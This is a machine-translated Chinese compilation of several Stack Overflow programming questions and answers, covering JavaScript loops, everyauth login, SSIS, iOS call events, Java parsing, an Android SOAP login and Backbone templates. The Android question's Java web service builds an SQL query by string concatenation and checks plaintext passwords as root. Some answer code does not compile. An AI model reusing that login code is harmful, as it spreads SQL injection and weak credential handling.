所以，基本上我想在`for`循环体中进行计算`root1`，然后`root2`if`root1`的计算结果无效。

我的第一直觉是显而易见的方法，将计算包装在帮助函数中，但我不确定这是最清晰的方法。我正在尝试在我的代码中很好地配置信息，并且对最多执行两次（每次迭代）的代码的函数调用会破坏该目标，而不会为我的代码提供大量的简洁性。

我在想可能是一个`for`循环，例如：

```
for ( root=root1; root1IsInvalid==true || bothRootsInvalid==true; root=root2 ) 
```

或`while`具有类似功能的。但我当然愿意接受其他建议

作为阅读此代码的人，哪种方法对您来说最易读和简洁？

顺便说一句，我正在用 JavaScript 编写这个特定的函数，但是与语言无关的解决方案会很棒。

编辑：澄清的代码片段

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:49:10.923

您有几种基本方法：

1.  将值放入一个数组并使用`for`循环对数组中的每个项目运行相同的代码，可能会在满足某些条件时停止迭代。
2.  创建一个执行计算的函数，然后只编写代码调用第一个函数，然后是第二个函数，依此类推。
3.  创建一个`while`循环并重复您的代码，直到满足某些条件。

第一个选项更容易扩展到 N 个项目。对于两个项目，第二个选项可能更简单。

您可以使计算函数成为本地函数（在您当前正在执行的函数中声明和使用），这样它就不会添加到全局命名空间中，并且您的代码仍然更加封装。

我也不确定你打算用这条线做什么：

```
root1, root2 = computeRoots(); 
```

但是，它只是将值分配给`root2`，看起来您可能希望`var`在这些之前将它们定义为局部变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:44:40.067

如果 Eager 评价没问题，你可以把你的根收集到一个数组中，`roots.filter(isinvalid)`用来取出无效的；然后只需使用结果数组中的第一项。

如果您需要惰性求值，您可以将其推广为一个函数，该函数对数组中的函数进行惰性求值，直到找到非空结果：

```
// call fn on items in arr until fn returns non-null
// returns [item, result]
// if result===false, no true value was returned
function firstNotNull(fn, arr) {
    var i, length, item, result=null;
    for (i = 0, length=arr.length; i < length; i++) {
        item = arr[i];
        result = fn(item);
        if (result!==null) {
            break;
        }
    }
    return [item, result];
}

function rootComputations(root) {
    var computationResult = null;
    if (root==1) {
        computationResult = 1;
    }
    return computationResult;
}

function computeRoots() {
    return [0,1];
}

function foo() {
    var velocity, roots, root, result, computations;
    for (velocity = 0; velocity < 100; velocity++) {
        roots = computeRoots();
        computations = firstNotNull(rootComputations, roots);
        console.log(computations);
        root = computations[0];
        result = computations[1];
    }
}

foo(); 
```

`firstNotNull()`您可以进一步概括：

```
// call fn on items in arr until cond(fn(item)) returns true
// returns [item, fn(item)], or null if unsatisfied
function firstSatisfying(cond, fn, arr) {
    var i, length, item, fnitem, result=null;
    for (i = 0, length=arr.length; i < length; i++) {
        item = arr[i];
        fnitem = fn(item);
        if (cond(fnitem)) {
            result = [item, fnitem];
            break;
        }
    }
    return result;
}

var firstNotNull = firstSatisfying.bind(null, function(item){return item!==null;}); 
```

您现在有了一个通用函数，用于获取满足您想要的任何条件的事物列表中的第一个。

ECMAScript 5 添加了许多方法，使得在数组上的*急切*函数式应用程序变得更加容易，但是 Javascript 没有任何用于*惰性*求值的本机工具。如果这是您认为您经常需要的东西，请考虑使用[stream.js](http://streamjs.org)，它提供了一种“流”数据类型以及用于部分应用的方法。使用 stream.js，您的逻辑将如下所示：

```
// rootStream should be a function which returns a Stream
// It should construct a stream with the first root produced
// and a function that returns the remaining roots.
// Since I don't know how you get your roots, I'll use a stupid example:
function rootStream() {
    return new Stream(0, function(){
        return new Stream(1);
    });
}

function isvalid(root) {
    return root===1;
}

Stream.range(0,100)
.walk(function(v){
    //v doesn't seem to be used?
    var firstvalid = rootStream().filter(isvalid).head();
    console.log(firstvalid);
}); 
```

# javascript - 使用everyauth的问题

> ID：14097510
> 
> 赞同：3
> 
> 时间：2012-12-31T04:41:34.437
> 
> 标签：javascript, facebook, everyauth

我在使用everyauth 时遇到了严重的问题。我需要的只是facebook登录。为此，我正在尝试使用everyauth 的示例。一旦我进行了 Facebook 身份验证，如果用户登录或未登录/获取他的 Facebook 信息，我如何检查每个页面。我所做的是

```
var exp = require('express');
var app = exp.createServer();

var conf = require('/Users/lakeshkansakar/clicker/node_modules/everyauth/example/conf')
var everyauth = require('everyauth');

everyauth.debug = true;

var usersById = {};
var nextUserId = 0;

function addUser (source, sourceUser) {
  var user;
  user = usersById[++nextUserId] = {id: nextUserId};
  user[source] = sourceUser;
  return user;
}

var usersByFbId = {};
var usersByTwitId = {};

everyauth.everymodule
  .findUserById( function (id, callback) {
    callback(null, usersById[id]);
  });

everyauth
  .facebook
    .appId(conf.fb.appId)
    .appSecret(conf.fb.appSecret)
    .findOrCreateUser( function (session, accessToken, accessTokenExtra, fbUserMetadata) {
      return usersByFbId[fbUserMetadata.id] || (usersByFbId[fbUserMetadata.id] = addUser('facebook', fbUserMetadata));;
    })
    .redirectPath('/');

everyauth
  .twitter
    .consumerKey(conf.twit.consumerKey)
    .consumerSecret(conf.twit.consumerSecret)
    .findOrCreateUser( function (sess, accessToken, accessSecret, twitUser) {
      return usersByTwitId[twitUser.id] || (usersByTwitId[twitUser.id] = addUser('twitter', twitUser));;
    })
    .redirectPath('/'); 
```

在每个获取请求中，我都尝试检查everyauth.loggedIn 是否为真。但是，everyauth.loggedIn 显示为未定义。为什么会这样？如何检查用户是否使用 facebook 登录？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T19:37:31.310

登录后，您将被重定向到“/”，如`.redirectPath('/');`.

在“/”的路线中，您可以检查`everyauth.loggedIn`.

您可以在此处查看更多详细信息。[如何检查用户是否已登录？（everyauth，node.js）](https://stackoverflow.com/questions/9029217/how-can-i-check-if-a-user-is-already-logged-in-everyauth-node-js)

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-09T18:52:29.730

不确定这是否有帮助，但我研究了 EveryAuth 和 Passport，并且能够非常快速地为 Facebook 和 Google 实施 Passport。它看起来像是一个更简洁的身份验证实现。

[http://passportjs.org/](http://passportjs.org/)

# c# - 如何调试作为 SSIS 项目一部分的脚本？

> ID：14097512
> 
> 赞同：2
> 
> 时间：2012-12-31T04:41:43.853
> 
> 标签：c#, sql-server, visual-studio, ssis, data-warehouse

我有两个数据库。源数据库： [http ://sdrv.ms/VkX8tj](http://sdrv.ms/VkX8tj)

和星数据库： [http ://sdrv.ms/12S7Zkc](http://sdrv.ms/12S7Zkc)

我正在使用 SSIS 项目将数据从第一个传输到第二个：sdrv.ms/YDUvU4

（无法发布第三个链接，不便之处敬请见谅）

如您所见，我的脚本中有错误。它是“该列有一个空值”。或者确切地说（通过弹出窗口）：

> 在 Microsoft.SqlServer.Dts.Pipeline.PipelineBuffer.CheckStatusAndNull(Int32 columnIndex) 在 Microsoft.SqlServer.Dts.Pipeline.PipelineBuffer.GetDecimal(Int32 columnIndex) 在 ScriptMain.Input0_ProcessInputRow(Input0Buffer Row) 在 UserComponent.Input0_ProcessInput(Input0Buffer Buffer) 在 Microsoft .SqlServer.Dts.Pipeline.ScriptComponent.ProcessInput（Int32 InputID，PipelineBuffer 缓冲区）在 Microsoft.SqlServer.Dts.Pipeline.ScriptComponentHost.ProcessInput（Int32 inputID，PipelineBuffer 缓冲区）

和（通过调试器的输出）：

> 错误：数据流任务中的 0xC0047062，脚本组件 [337]：Microsoft.SqlServer.Dts.Pipeline.ColumnIsNullException：列具有空值。在 Microsoft.SqlServer.Dts.Pipeline.ScriptComponentHost.HandleUserException(Exception e) 在 Microsoft.SqlServer.Dts.Pipeline.ScriptComponentHost.ProcessInput(Int32 inputID, PipelineBuffer 缓冲区) 在 Microsoft.SqlServer.Dts.Pipeline.ManagedComponentHost.HostProcessInput(IDTSManagedComponentWrapper100 包装, Int32 inputID, IDTSBuffer100 pDTSBuffer, IntPtr bufferWirePacket) 错误：0xC0047022 在数据流任务，SSIS.Pipeline：SSIS 错误代码 DTS_E_PROCESSINPUTFAILED。处理输入“输入 0”(347) 时，组件“脚本组件”(337) 上的 ProcessInput 方法失败，错误代码为 0x80131600。已识别的组件从 ProcessInput 方法返回错误。该错误是特定于组件的，但该错误是致命的，将导致数据流任务停止运行。在此之前可能会发布错误消息，其中包含有关失败的更多信息。

我的脚本与模板完全相同，只是填写了这一功能：

```
public override void Input0_ProcessInputRow(Input0Buffer Row)
{
    decimal WorkerWage = Row.Amount * Row.HourWage * Row.ProductionHours;
    Row.WorkerWage = WorkerWage;

    decimal TotalProductionCost = Row.Amount * Row.ProductionHours * (Row.ProductionCost + Row.HourCost) + WorkerWage;
    Row.TotalProductionCost = TotalProductionCost;

    decimal StandardPrice = TotalProductionCost * (1 + Row.Profit/100);
    Row.StandardPrice = StandardPrice;

    decimal TotalDiscount = StandardPrice * (Row.Discount / 100);
    Row.TotalDiscount = TotalDiscount;

    decimal TotalPrice = StandardPrice - TotalDiscount;
    Row.TotalPrice = TotalPrice;

    decimal TotalShippingCost = Row.ShippingCost + TotalPrice * (Row.ShippingTax / 100);
    Row.TotalShippingCost = TotalShippingCost;

    decimal RealProfit = TotalPrice - TotalProductionCost;
    Row.RealProfit = RealProfit;

    decimal TraderMargin = RealProfit * (Row.ProfitMargin / 100);
    Row.TraderMargin = TraderMargin;
} 
```

“该列有一个空值”意味着什么，但它是输入列还是输出列，究竟是哪一个？如何弄清楚？

顺便说一句，请不要关注这个项目基于内容的价值，因为它已经完成（我希望将会完成）只是为了教育目的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T04:53:33.047

查看您的架构，似乎没有任何列允许 NULL。因此，来自源列的值为 NULL 是不可能的。

您可以将失败的行重定向到不同的目标并查看它以识别有问题的行。

拉吉

# iphone - 如果未设置断点，则不会调用 CTCallState 事件处理程序

> ID：14097514
> 
> 赞同：1
> 
> 时间：2012-12-31T04:41:57.237
> 
> 标签：iphone, objective-c, ios, ipad

我遇到了有史以来最奇怪的错误，我正在我的 iPhone 上运行该应用程序，并且我有以下代码：

```
self.callCenter = [[CTCallCenter alloc] init];
    [self.callCenter setCallEventHandler: ^(CTCall* call) {
        if ([call.callState isEqualToString: CTCallStateDisconnected]) {
            NSLog(@"call ended");
            dispatch_sync(dispatch_get_main_queue(), ^(void) {
                NSLog(@"on main thread!");
                NSMutableDictionary *userInfo = [NSMutableDictionary dictionary];
                [userInfo setValue:weakSelf.recordRef forKey:kContactKey];
                [[NSNotificationCenter defaultCenter] postNotificationName:kCallEndedNotification object:nil userInfo:userInfo];
            });
        }
    }]; 
```

由于某种原因，没有调用此代码块。但是如果我在 if 语句上放了一个断点，它就会被调用。知道为什么会发生这种情况吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T15:31:28.773

我相信这是一个 iOS SKD 6 错误。因为事件“CTCallStateDisconnected”应该在你的应用程序处于后台时被调用，所以它根本不会被调用。我认为，为什么将断点放在那里就可以了，原因是因为调用事件的时间。如果它在断点处停止，则呼叫仍在进行，并且当您的应用程序处于前台时会调用事件。

看这里，在 iOS5 中这是有效的： [setCallEventHandler test](https://stackoverflow.com/questions/13553635/callstatedisconnected-only-detected-for-incoming-calls-not-for-calls-made-from/13678256#13678256)

# java - 有没有一种方便的方法可以将逗号分隔的字符串转换为 hashmap

> ID：14097515
> 
> 赞同：0
> 
> 时间：2012-12-31T04:41:59.123
> 
> 标签：java

字符串格式是（不是json格式）：</p>

```
a="0PN5J17HBGZHT7JJ3X82", b="frJIUN8DYpKDtOLCwo/yzg=" 
```

我想将此字符串转换为 HashMap：

`a`有价值的钥匙`0PN5J17HBGZHT7JJ3X82`

`b`有价值的钥匙`frJIUN8DYpKDtOLCwo/yzg=`

有没有方便的方法？谢谢

我试过的：

```
 Map<String, String> map = new HashMap<String, String>();
    String s = "a=\"00PN5J17HBGZHT7JJ3X82\",b=\"frJIUN8DYpKDtOLCwo/yzg=\"";
    String []tmp = StringUtils.split(s,',');
    for (String v : tmp) {
        String[] t = StringUtils.split(v,'=');
        map.put(t[0], t[1]);
    } 
```

我得到这个结果：

`a`有价值的钥匙`"0PN5J17HBGZHT7JJ3X82"`

`b`有价值的钥匙`"frJIUN8DYpKDtOLCwo/yzg`

对于 key `a`，开始和结束双引号 (") 是不需要的；对于 key `b`，开始双引号 (") 是不需要的，并且缺少最后一个等号 (=)。对不起我糟糕的英语。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-31T04:49:52.670

可能你不关心它是一个 HashMap，只是一个 Map，所以这会做到，因为 Properties 实现了 Map：

```
import java.io.StringReader;
import java.util.*;

public class Strings {
    public static void main(String[] args) throws Exception {
        String input = "a=\"0PN5J17HBGZHT7JJ3X82\", b=\"frJIUN8DYpKDtOLCwo/yzg=\"";
        String propertiesFormat = input.replaceAll(",", "\n");
        Properties properties = new Properties();
        properties.load(new StringReader(propertiesFormat));
        System.out.println(properties);
    }
} 
```

输出：

```
{b="frJIUN8DYpKDtOLCwo/yzg=", a="0PN5J17HBGZHT7JJ3X82"} 
```

如果您绝对需要一个 HashMap，您可以使用 Properties 对象作为输入构造一个：`new HashMap(properties)`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:28:36.740

在的基础上拆分字符串，`commas (",")`然后使用 with`("=")`

```
String s = "Comma Separated String";
HashMap<String, String> map = new HashMap<String, String>();

String[] arr = s.split(",");

String[] arStr = arr.split("=");

map.put(arr[0], arr[1]); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:29:59.423

在 Ryan 的代码中添加了一些更改

```
 public static void main(String[] args) throws Exception {
        String input = "a=\"0PN5J17HBGZHT7JJ3X82\", b=\"frJIUN8DYpKDtOLCwo/yzg=\"";
        input=input.replaceAll("\"", "");
        String propertiesFormat = input.replaceAll(",", "\n");
        Properties properties = new Properties();
        properties.load(new StringReader(propertiesFormat));
        Set<Entry<Object, Object>> entrySet = properties.entrySet();
        HashMap<String,String > map = new HashMap<String, String>();
        for (Iterator<Entry<Object, Object>> it = entrySet.iterator(); it.hasNext();) {
            Entry<Object,Object> entry = it.next();
            map.put((String)entry.getKey(), (String)entry.getValue());
        }
        System.out.println(map);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-15T23:52:18.897

您也可以使用下面的正则表达式。

```
Map<String,String> data = new HashMap<String,String>();
Pattern p = Pattern.compile("[\\{\\}\\=\\, ]++");
String[] split = p.split(text);
for ( int i=0; i+2 <= split.length; i+=2 ){
    data.put( split[i], split[i+1] );
}
return data; 
```

# javascript - 如何使用 jQuery 检查表单的有效性？

> ID：14097517
> 
> 赞同：0
> 
> 时间：2012-12-31T04:42:46.643
> 
> 标签：javascript, jquery, asp.net-mvc, asp.net-mvc-3, visual-studio-2012

我之前有一个关于如何检查提交的问题，答案是这样的：

```
$("form").on("submit", function() {
    var $form = $(this);

    // if there are validation errors do not continue.
    if (!$form.valid()) {
        return false;
    }
});​ 
```

但是在 VS2012 中，它显示 .valid 为“此属性在 jQuery 类型的值上不存在”。请注意，我还没有尝试运行它，因为我仍然在 VS2012 编辑器中看到语法错误。

在我的脚本目录中，我有以下**_reference.js**文件。我应该告诉 VS2012 还是在我的脚本中引用它？

```
/// <reference path="jquery-1.8.3.js" />
/// <reference path="jquery.validate.js" />
/// <reference path="jquery.validate.unobtrusive.js" /> 
```

有人可以给我一些关于什么是错的建议吗？

**解决方案**

我有一个 _reference.js 文件，但为了使这项工作正常，我必须在我的脚本中包含对 _reference.js 文件的引用。现在它工作正常。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:52:40.253

您需要先打电话`validate()`再打电话`valid()`

```
$("form").validate();
$("form").on("submit", function() {
    var $form = $(this);

    // if there are validation errors do not continue.
    if (!$form.valid()) {
        return false;
    }
});​ 
```

# iphone - 如何从设备获取发件人电子邮件？

> ID：14097521
> 
> 赞同：1
> 
> 时间：2012-12-31T04:43:14.557
> 
> 标签：iphone, xml, xcode, email

我正在将一些数据从我的应用程序发送到服务器。我的数据由不同的字段组成，如下所示我的代码

```
-(void)createXML
{
xmlStr = @"<?xml version='1.0'?>\n<jand_req>\n<inquiryList>\n<productArr>\n";
NSString *nameStr=[NSString stringWithFormat:@"<name>%@</name>\n",name.text];
xmlStr=[xmlStr stringByAppendingString:nameStr];
NSString *compNameStr=[NSString stringWithFormat:@"<comp_name>%@</comp_name>\n",compName.text];
xmlStr=[xmlStr stringByAppendingString:compNameStr];
NSString *cityStr=[NSString stringWithFormat:@"<city>%@</city>\n",city.text];
xmlStr=[xmlStr stringByAppendingString:cityStr];
NSString *countryStr=[NSString stringWithFormat:@"<country>%@</country>\n",[nameToCode objectForKey:country.text]];
xmlStr=[xmlStr stringByAppendingString:countryStr];
NSString *commentsStr=[NSString stringWithFormat:@"<comment>%@</comment>\n",commentsBox.text];
xmlStr=[xmlStr stringByAppendingString:commentsStr];
xmlStr=[xmlStr stringByAppendingString:@"</userDetail>\n</inquiryList>\n</jand_req>"];
} 
```

在此之后，我将上述数据发送到服务器，如下所示

```
- (void)submitForm
 {
[self createXML];

NSLog(@"myaccesscode%@",[fn getValFromSettings:@"accessCode"]);
   NSString *serviceUrlStr=[NSString stringWithFormat:@"%@/%@/API_sendmail.php?access_code=%@",domainName,apiFolderPath,[fn getValFromSettings:@"accessCode"]];
    NSLog(@"%@",serviceUrlStr);
    NSURL * serviceUrl = [NSURL URLWithString:[serviceUrlStr stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
    NSMutableURLRequest * serviceRequest = [NSMutableURLRequest requestWithURL:serviceUrl cachePolicy:NSURLRequestReloadIgnoringLocalAndRemoteCacheData timeoutInterval:100];
    [serviceRequest setValue:@"text/xml" forHTTPHeaderField:@"Content-type"];
    [serviceRequest setHTTPMethod:@"POST"];
    [serviceRequest setHTTPBody:[xmlStr dataUsingEncoding:NSUTF8StringEncoding]];
    NSURLConnection *conn=[[[NSURLConnection alloc] initWithRequest:serviceRequest delegate:self startImmediately:YES] autorelease];
} 
```

以上所有代码对我来说都很好，但现在我想在此代码中包含另一个功能，其中包含发件人电子邮件地址，但此发件人电子邮件必须从设备中获取，与我们在应用程序中使用 MFMailComposeViewController 时相同，然后自动获取从设备获取发件人电子邮件地址。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:18:24.010

```
#import <AddressBook/AddressBook.h>

NSString *emailAddr = @"";
ABPerson *aPerson = [[ABAddressBook sharedAddressBook] me];
ABMultiValue *emails = [aPerson valueForProperty:kABEmailProperty];
if([emails count] > 0)
    emailAddr = [emails valueAtIndex:0]; 
```

不要忘记添加 AddressBook.framework。

现在，emailAddr 包含发件人电子邮件，您可以将其附加到您的 xml 字符串或任何您想要的位置！

```
-(void)createXML
{
    // Your code
    NSString *emailStr=[NSString stringWithFormat:@"<email>%@</email>\n",emailAddr];
    xmlStr=[xmlStr stringByAppendingString:emailStr];
} 
```

快乐编码！

# java - 获取电子邮件并在 android textview 上显示

> ID：14097527
> 
> 赞同：0
> 
> 时间：2012-12-31T04:44:00.177
> 
> 标签：java, android, web-services, textview, fetch

我必须开发一个 android 应用程序。

在这里，我必须为自己的用户获取电子邮件并在 android textview 上显示该电子邮件。我该如何开发这些。请给我任何想法。

这是我的网络服务代码：

```
public class Login {
  public String authentication(String username,String password){

       String retrievedUserName = "";
       String retrievedPassword = "";
       String retrievedEmail = "";
       String status = "";
       try{
        Class.forName("com.mysql.jdbc.Driver");
        Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/xcart-432pro","root","");
       PreparedStatement statement =  con.prepareStatement("SELECT * FROM xcart_customers WHERE login = '"+username+"'");
         ResultSet result = statement.executeQuery();
         while(result.next()){  
          retrievedUserName = result.getString("login");
          retrievedPassword = result.getString("password");
          retrievedEmail = result.getString("email");   
           }
         if(retrievedUserName.equals(username)&&retrievedPassword.equals(password)&&!(retrievedUserName.equals("") && retrievedPassword.equals(""))){
         status = retrievedEmail;
           }

       else {
        status = "Login fail!!!";
          }

            }

          catch(Exception e){
          e.printStackTrace();
            }
         return status;

             }

              } 
```

在这里我必须运行这些 web 服务代码意味着如果登录成功意味着成功显示电子邮件 ID。如果我的登录不正确意味着显示登录失败消息。所以我的 web 服务代码是正确的。

如果我的登录成功意味着必须在 android textview 上显示电子邮件。否则必须显示登录失败消息。

但是在这里我遇到了一个问题：

如果我输入了正确的登录详细信息，则表示该时间也显示了登录失败消息。但我必须需要 o/p，例如如果我的登录成功意味着显示电子邮件，否则登录失败消息。

我的代码有什么问题。请给我解决方案。

这是我的安卓端代码：

```
 public class CustomerLogin extends Activity {
    private static final String SPF_NAME = "vidslogin";
    private static final String USERNAME = "login";
    private static final String PASSWORD = "password";
   private static final String PREFS_NAME = null;

         private String login;
       String mGrandTotal,total,mTitle,mTotal,mQty,mCost;

      EditText username,userPassword;
      private final String NAMESPACE = "http://xcart.com";
      private final String URL = "http://10.0.0.75:8085/XcartLogin/services/Login?wsdl";
      private final String SOAP_ACTION = "http://xcart.com/authentication";
      private final String METHOD_NAME = "authentication";
      private String uName;

         /**Called when the activity is first created. */
        @Override
        public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.customer_login);
        username = (EditText) findViewById(R.id.tf_userName);
        userPassword = (EditText) findViewById(R.id.tf_password);

         Button login = (Button) findViewById(R.id.btn_login);
         login.setOnClickListener(new View.OnClickListener() {

         public void onClick(View arg0) {
          loginAction();

          }
         });
          }
          private void loginAction(){

             SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
            EditText username = (EditText) findViewById(R.id.tf_userName);
                 String user_Name = username.getText().toString();
              EditText userPassword = (EditText) findViewById(R.id.tf_password);
               String user_Password = userPassword.getText().toString();

                 //Pass value for userName variable of the web service
               PropertyInfo unameProp =new PropertyInfo();
               unameProp.setName("username");//Define the variable name in the web service method
               unameProp.setValue(user_Name);//set value for userName variable
        unameProp.setType(String.class);//Define the type of the variable
        request.addProperty(unameProp);//Pass properties to the variable

      //Pass value for Password variable of the web service
        PropertyInfo passwordProp =new PropertyInfo();
        passwordProp.setName("password");
        passwordProp.setValue(user_Password);
        passwordProp.setType(String.class);
        request.addProperty(passwordProp);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.setOutputSoapObject(request);
        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

        try{
            androidHttpTransport.call(SOAP_ACTION, envelope);
               SoapPrimitive response = (SoapPrimitive)envelope.getResponse();
               String status = response.toString();
               TextView email = (TextView) findViewById(R.id.tv_status);
               email.setText(response.toString());

               if(status.equals(email))
               {

if(isUserValidated && isPasswordValidated)
{

    Intent intent = new Intent(CustomerLogin.this,PayPalIntegrationActivity.class);

  startActivity(intent);

      }
       }

                       else
                          {

                           LayoutInflater inflater = getLayoutInflater();
                           View layout = inflater.inflate(R.layout.toast_custom_layout,
                                (ViewGroup) findViewById(R.id.toast_layout_root));
                          Toast toast = new Toast(getApplicationContext());
                          toast.setGravity(Gravity.TOP, 0, 30);
                          toast.setDuration(Toast.LENGTH_LONG);
                          toast.setView(layout);
                          toast.show();

                          }
                         }
              catch(Exception e){

                  }
                 }

          } 
```

**编辑：**

在这里，我编写了类似手段的代码

```
 if(status.equals("krishnaveniveeman@gmail.com")) 
```

输入正确的登录详细信息后，我在 textview 中收到电子邮件。

在这里，我如何从 web 服务获取电子邮件并在 textview 上设置电子邮件。

我必须像这样写代码

```
 if(status.equals(email)) 
```

表示仅显示登录失败消息。但我的登录详细信息仅正确。

请任何人给我解决这些问题。

# objective-c - 在标签上显示 NSTimer 值

> ID：14097528
> 
> 赞同：0
> 
> 时间：2012-12-31T04:44:07.027
> 
> 标签：objective-c, ios, nstimer

我的项目中有一个按钮和一个标签。单击按钮后，我需要启动一个在标签上`NSTimer`显示其值的按钮。例如 1 秒。我不确定计时器是否返回值。还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:02:34.443

```
 NSTimer *aTimer = [NSTimer timerWithTimeInterval:(1) target:self selector:@selector(timerFired:) userInfo:nil repeats:YES];
        NSRunLoop *runner = [NSRunLoop currentRunLoop];
        [runner addTimer:aTimer forMode: NSDefaultRunLoopMode]; 
int i=0;

    - (void)timerFired:(NSTimer*)theTimer 
    {

    if(condition)
    {
    // timer repeat
    // your actions
     i++;
        int conseconds = i % 60; 
        int conminutes = (i / 60) % 60; 

        timelable.text=[NSString stringWithFormat:@"%02d:%02d", conminutes,conseconds];
    [theTimer isValid];
    }
    else
    {
    // your actions
    //timer stopped
    [theTimer invalidate];
    }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:51:18.803

在按钮点击功能中

```
{
      NSTimer *t;
      t=[NSTimer scheduledTimerWithTimeInterval:1 target:self selector:@selector(showTimer) userInfo:nil repeats:YES];
} 
```

在 showTimer 函数中

```
-(void)showTimer{
    static int i=0;
    static int min=0;

    if(i>=59){
        i=0;
        min++;
    } else {
        i++;
    }

    yourLabel.text=[NSString stringWithFormat:@" %d:%d ",min,i];
} 
```

# azure - Windows Azure 模拟器在升级到 SQL Server 2012 后停止工作

> ID：14097530
> 
> 赞同：0
> 
> 时间：2012-12-31T04:44:36.910
> 
> 标签：azure, sql-server-2012

我最近安装了 SQL Server 2012。安装后我必须运行 DSInit 命令。

当我在本地计算机上启动 Web 角色时，我收到消息 - “Internet Explorer 无法显示网页”。Web 角色停止工作；模拟器控制台上没有错误。

有想法该怎么解决这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:04:44.407

在卸载 SQL Server 2012 并使用命名实例而不是默认实例重新安装时，对问题进行了排序

# entity - Yesod/Persistent 字段与 Eq

> ID：14097531
> 
> 赞同：3
> 
> 时间：2012-12-31T04:44:37.820
> 
> 标签：entity, persistent, yesod

在[Yesod book 的 Persistent 章节中](http://www.yesodweb.com/book/persistent)，某个字段被赋予了`Eq`后缀，但从未解释过为什么。在关系部分，我们看到以下模型：

```
Person
    name String
    deriving Show
Car
    ownerId PersonId Eq
    name String
    deriving Show 
```

不久之后，我们看到：

```
Person
    name String
Store
    name String
PersonStore
    personId PersonId
    storeId StoreId
    UniquePersonStore personId storeId 
```

除了后者是多对多之外，还有什么区别？我在 IRC 上收集到`Eq`后缀可以加入该字段。如果是这样，为什么一个人*不*想要`Eq`后缀？除了关系之外，还有其他情况`Eq`应该使用吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T06:15:43.210

我以为我已经摆脱了所有这些……这只是需要的 Persistent 旧时代的遗留`Eq`物。这些天来，它什么也没做，你可以比较*所有*领域的平等。

平等测试可以用于很多情况，例如“查找作者的所有帖子”：

```
selectList [PostAuthor ==. userId] [Desc PostDate] 
```

# javascript - Blackberry Webworks/Phonegap 文件浏览器

> ID：14097532
> 
> 赞同：1
> 
> 时间：2012-12-31T04:44:40.610
> 
> 标签：javascript, cordova, blackberry-webworks, blackberry-playbook

我正在从 Air/Actionscript 迁移到 WebWorks 并且遇到了一些困难。我已经尝试了几个在网络上找到的 Phonegap 文件浏览器教程和示例，但它们不适用于 Playbook。我已将 access_shared 权限添加到配置中。我有一个，当我的应用程序启动时，它应该将目录和文件加载到 .

我的js如下：

```
document.addEventListener("deviceready", onDeviceReady, false);
function onDeviceReady(){
window.requestFileSystem(
LocalFileSystem.PERSISTENT,
0, onFileSystemSuccess, fail
);
}

function onFileSystemSuccess(fileSystem) {
// Create some test files
fileSystem.root.getDirectory("myDirectory",
{ create: true, exclusive: false },
null,fail);
fileSystem.root.getFile("readthis.txt",
{ create: true, exclusive: false },
null,fail);
var directoryReader = fileSystem.root.createReader();
// Get a list of all the entries in the directory
directoryReader.readEntries(success,fail);
}

function success(entries) {
var i;
var objectType;
for (i=0; i<entries.length; i++) {
if(entries[i].isDirectory == true) {
objectType = 'Directory';
} else {
objectType = 'File';
}
$('#directoryList').append('<li><h3>' + entries[i].name + '</
h3><p>' + entries[i].toURI() + '</p><p class="ui-li-aside">Type:
<strong>' + objectType + '</strong></p></li>');
}
$('#directoryList').listview("refresh");
}

function fail(error) {
alert("Failed to list directory contents: " + error.code);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T01:26:25.563

我发现 KitchenSink 中的 DIR 示例向我展示了我需要知道的内容。

# javascript - 使用主干 js 加载模板

> ID：14097535
> 
> 赞同：11
> 
> 时间：2012-12-31T04:45:18.930
> 
> 标签：javascript, ajax, backbone.js, requirejs, underscore.js

我开始进行 javascript 开发，并使用 node.js 作为休息 API 和使用主干的客户端做了一个简单的项目，一切看起来都很完美，直到我想从我的 js 中获取我的模板。

我发现了不同的方法，其中一些需要一段时间（比如一岁），但我不明白哪一个会更好：

*   带有 html 代码的 var 的 .js 文件

    优点 -> 易于加载，易于传递给下划线来编译它。

    缺点-> scape 每一行。

    ```
    app.templates.view = " \
    <h3>something code</h3> \
    "; 
    ```

    加载模板：

    ```
    template: _.template(app.templates.view) 
    ```

[下划线中的外部模板](https://stackoverflow.com/questions/8366733/external-template-in-underscore)

*   使用 require.js 加载文本插件。

    优点 -> 根据需要加载不同的模板。

    缺点->我不喜欢将所有内容都放在“加载器”函数中的方法...

    ```
    define(["TemplateEngine", "text!templates/template.html"], function(... 
    ```

[RequireJS：加载模块，包括模板和 CSS](https://stackoverflow.com/questions/7917639/requirejs-loading-modules-including-templates-and-css)

*   使用 AJAX 请求加载模板的函数。

    优点 -> 您可以加载您需要的模板并添加本地存储可能性。

    缺点-> 似乎我必须将所有模板合并到一个文件中以用于生产环境。

    ```
    function() {

    var templateLoader = {... $.get calls ...} 
    ```

[异步加载下划线模板的最佳方式](https://stackoverflow.com/questions/7542089/best-way-to-load-asynchronously-undescore-templates)

*   还有一个我非常喜欢但似乎没有发布的用于模板加载的Jquery插件？

